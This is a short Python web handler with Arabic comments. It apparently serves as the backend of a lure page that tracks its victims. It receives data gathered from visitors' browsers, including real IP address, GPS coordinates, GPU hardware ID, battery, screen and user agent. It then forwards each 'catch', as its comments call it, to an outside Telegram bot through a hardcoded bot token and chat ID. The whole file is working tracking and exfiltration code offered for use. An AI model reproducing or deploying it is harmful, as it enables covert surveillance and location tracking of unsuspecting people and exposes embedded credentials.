from http.server import BaseHTTPRequestHandler
import json
import requests

# بياناتك الصحيحة اللي أرسلتها اللحين
TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg"
CHAT_ID = "5811700860"

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # قراءة البيانات القادمة من المتصفح
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))

            # استخراج المصيدة
            device = data.get('device', {})
            action_type = data.get('action', 'نشاط غير محدد')

            # تجهيز رسالة "الصيدة" لتصلك مرتبة في تليجرام
            message = (
                "⚠️ **صيدة جديدة مكتملة الأركان** ⚠️\n"
                "━━━━━━━━━━━━━━━\n"
                f"📝 **العملية:** {action_type}\n"
                f"🌐 **الـ IP الحقيقي:** `{device.get('ip', 'مخفي')}`\n"
                f"🔋 **البطارية:** {device.get('battery', 'N/A')}\n"
                f"🆔 **HW-ID (GPU):** `{device.get('gpu_hwid', 'N/A')}`\n"
                f"📱 **نوع الجهاز:** {device.get('platform', 'N/A')}\n"
                f"🖥 **دقة الشاشة:** {device.get('screen', 'N/A')}\n"
                f"📶 **نوع الشبكة:** {device.get('network', 'N/A')}\n"
                f"📍 **إحداثيات الـ GPS:** {device.get('gps', 'لم يوافق بعد')}\n"
                "━━━━━━━━━━━━━━━\n"
                f"🔍 **البصمة الرقمية:** \n`{device.get('userAgent', 'N/A')[:100]}...`"
            )

            # الإرسال الفوري لبوت التليجرام الخاص بك
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                data={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
            )

            # إرسال رد للمتصفح عشان يكمل العداد شغله وما يعلق
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success"}).encode())

        except Exception as e:
            # في حال وجود أي خطأ تقني داخلي
            print(f"Server Error: {e}")
            self.send_response(500)
            self.end_headers()
